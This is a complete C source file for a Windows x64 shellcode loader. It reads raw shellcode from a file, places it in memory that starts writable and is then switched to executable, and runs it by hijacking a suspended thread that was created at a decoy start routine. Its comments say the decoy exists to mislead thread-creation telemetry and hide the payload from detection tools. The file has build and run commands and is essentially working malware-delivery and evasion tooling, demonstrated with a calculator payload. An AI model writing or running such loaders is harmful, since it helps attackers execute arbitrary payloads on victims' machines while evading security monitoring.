/*
 * Iteration 1 — x64 shellcode loader
 * Techniques: RW_to_RX + thread_hijacking_local
 * Build (MSVC x64):
 *   cl.exe /nologo /O2 /GS- loader.c
 * Run:
 *   loader.exe C:\path\to\calc.bin
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>

/*
 * Decoy stub — a benign thread start routine that lives in OUR OWN image's
 * .text section (module-backed, not private memory). The thread is created
 * suspended with this as its recorded StartAddress, so CreateThread telemetry
 * shows a module-backed entry point rather than the payload.
 *
 * If the hijacked thread ever returns here (e.g. payload executes a `ret`),
 * we exit the thread cleanly.
 */
static DWORD WINAPI DecoyStub(LPVOID lpParam)
{
    (void)lpParam;
    /* If we ever actually run here (e.g. payload returns), just exit. */
    ExitThread(0);
    return 0; /* unreachable */
}

int main(int argc, char* argv[])
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <shellcode.bin>\n", argv[0]);
        return 1;
    }

    /* ---- 1. Read shellcode from file (no hardcoded bytes) ---- */
    FILE* fp = fopen(argv[1], "rb");
    if (!fp) {
        fprintf(stderr, "[-] fopen failed for %s (errno=%d)\n", argv[1], errno);
        return 1;
    }
    if (fseek(fp, 0, SEEK_END) != 0) { fclose(fp); return 1; }
    long fsz = ftell(fp);
    if (fsz <= 0) { fclose(fp); fprintf(stderr, "[-] empty file\n"); return 1; }
    if (fseek(fp, 0, SEEK_SET) != 0) { fclose(fp); return 1; }

    SIZE_T sc_size = (SIZE_T)fsz;
    unsigned char* sc = (unsigned char*)malloc(sc_size);
    if (!sc) { fclose(fp); return 1; }

    size_t got = fread(sc, 1, sc_size, fp);
    fclose(fp);
    if (got != sc_size) {
        fprintf(stderr, "[-] short read\n");
        free(sc);
        return 1;
    }

    /* ---- 2. RW allocation, then flip to RX (RW_to_RX) ---- */
    LPVOID exec = VirtualAlloc(NULL, sc_size,
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_READWRITE);
    if (!exec) {
        fprintf(stderr, "[-] VirtualAlloc(RW) failed: %lu\n", GetLastError());
        free(sc);
        return 1;
    }

    memcpy(exec, sc, sc_size);
    /* Wipe the local copy of the bytes; only the mapping holds them now. */
    SecureZeroMemory(sc, sc_size);
    free(sc);

    DWORD oldProt = 0;
    if (!VirtualProtect(exec, sc_size, PAGE_EXECUTE_READ, &oldProt)) {
        fprintf(stderr, "[-] VirtualProtect(RX) failed: %lu\n", GetLastError());
        VirtualFree(exec, 0, MEM_RELEASE);
        return 1;
    }

    /* ---- 3. thread_hijacking_local ----
     * Create a suspended thread whose start routine is a benign stub inside
     * our own image. Its recorded StartAddress is module-backed. We then flip
     * RIP to the shellcode and resume.
     */
    HANDLE th = CreateThread(NULL, 0,
                             (LPTHREAD_START_ROUTINE)DecoyStub,
                             NULL,
                             CREATE_SUSPENDED,
                             NULL);
    if (!th) {
        fprintf(stderr, "[-] CreateThread(suspended) failed: %lu\n", GetLastError());
        VirtualFree(exec, 0, MEM_RELEASE);
        return 1;
    }

    CONTEXT ctx;
    ZeroMemory(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_CONTROL;
    if (!GetThreadContext(th, &ctx)) {
        fprintf(stderr, "[-] GetThreadContext failed: %lu\n", GetLastError());
        TerminateThread(th, 0);
        CloseHandle(th);
        VirtualFree(exec, 0, MEM_RELEASE);
        return 1;
    }

    /* Redirect instruction pointer to the payload. */
    ctx.Rip = (DWORD64)(ULONG_PTR)exec;

    /* Align the stack the way a normal x64 function entry expects (16-byte
     * aligned RSP at the call boundary). The suspended thread's RSP already
     * points into its own stack; nudge it down a bit to give the payload
     * room and keep 16-byte alignment. */
    ctx.Rsp = (DWORD64)((ULONG_PTR)ctx.Rsp & ~(ULONG_PTR)0xF);

    if (!SetThreadContext(th, &ctx)) {
        fprintf(stderr, "[-] SetThreadContext failed: %lu\n", GetLastError());
        TerminateThread(th, 0);
        CloseHandle(th);
        VirtualFree(exec, 0, MEM_RELEASE);
        return 1;
    }

    if (ResumeThread(th) == (DWORD)-1) {
        fprintf(stderr, "[-] ResumeThread failed: %lu\n", GetLastError());
        TerminateThread(th, 0);
        CloseHandle(th);
        VirtualFree(exec, 0, MEM_RELEASE);
        return 1;
    }

    /* ---- 4. Wait for the payload thread to finish, then clean up.
     * The shellcode (calc.bin) typically spawns its process and terminates
     * the thread/process itself. If it instead executes a `ret`, control may
     * land on whatever the stack holds; the DecoyStub path is best-effort.
     */
    WaitForSingleObject(th, INFINITE);
    CloseHandle(th);
    VirtualFree(exec, 0, MEM_RELEASE);

    return 0;
}